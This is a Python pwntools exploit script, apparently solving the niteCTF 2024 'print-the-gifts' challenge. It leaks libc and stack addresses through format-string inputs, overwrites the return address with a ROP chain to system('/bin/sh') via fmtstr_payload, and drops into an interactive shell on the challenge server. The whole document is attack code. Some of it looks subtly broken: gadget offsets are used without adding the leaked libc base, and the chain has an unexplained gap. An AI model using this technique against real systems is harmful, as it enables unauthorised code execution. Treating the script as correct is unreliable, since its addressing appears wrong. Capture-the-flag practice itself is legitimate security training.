from pwn import p64, u64, ELF, context, remote, process, log, fmtstr_payload

def exploit(checkRemote):
    if(checkRemote is True):
        r = remote('print-the-gifts.chals.nitectf2024.live', 1337, ssl=True)
    else:
        context.binary = binary = ELF('./chall_patched', checksec=False)
        r = process()
    
    # Leak libc_addr in 21th
    payload = b'%23$lx'
    r.sendlineafter('>', payload)

    r.recvuntil('Santa brought you a ')
    libc_leak = int(r.recvline().decode(), 16) - 0x124a
    system_addr = libc_leak + 0x4c490
    binsh_addr = libc_leak + 0x196031
    
    log.info(f'Address of libc base is {hex(libc_leak)}')
    log.info(f'Address of system() is {hex(system_addr)}')
    log.info(f'Address of /bin/sh is {hex(binsh_addr)}')

    # Leak stack address
    r.sendlineafter(':', b'y')
    r.sendlineafter('>', b'%p')
    r.recvuntil('Santa brought you a ')
    stack_leak = int(r.recvline().decode('utf-8'), 16)
    rip_addr = stack_leak + 0x21a0 + 0x8

    log.info(f'Address of "leaked stack" is {hex(stack_leak)}')
    log.info(f"Address of $RIP is {hex(rip_addr)}")

    # Final Exploit
    r.sendlineafter(':', b'y')
    pop_rdi = 0x277e5
    ret = 0x26e99
    pop_rsi = 0x28f99


    log.info(f'Address of "pop rdi" is {hex(pop_rdi)}')
    log.info(f'Address of "ret" is {hex(ret)}')

    # Start at 8th
    # payload = '%' + str(pop_rdi) + 'c%10$nA' + str(rip_addr)
    # payload += '%' + str(binsh_addr) + 'c%13$nA' + str(rip_addr + 0x8)
    # payload += '%' + str(system_addr) + 'c%16$nA' + str(rip_addr + 0x10)

    payload = fmtstr_payload(offset=8, writes={rip_addr: pop_rdi}, write_size='short')
    r.sendlineafter('>', payload)
    r.sendlineafter(':', b'y')

    payload = fmtstr_payload(offset=8, writes={rip_addr + 8: binsh_addr}, write_size='short')
    r.sendlineafter('>', payload)
    r.sendlineafter(':', b'y')

    payload = fmtstr_payload(offset=8, writes={rip_addr + 16: pop_rsi}, write_size='short')
    r.sendlineafter('>', payload)
    r.sendlineafter(':', b'y')

    payload = fmtstr_payload(offset=8, writes={rip_addr + 24: 0x0}, write_size='short')
    r.sendlineafter('>', payload)
    r.sendlineafter(':', b'y')

    payload = fmtstr_payload(offset=8, writes={rip_addr + 32: ret}, write_size='short')
    r.sendlineafter('>', payload)
    r.sendlineafter(':', b'y')

    payload = fmtstr_payload(offset=8, writes={rip_addr+0x40: system_addr}, write_size='short')
    r.sendlineafter('>', payload)
    r.sendlineafter(':', b'y')
    
    r.interactive()

exploit(True)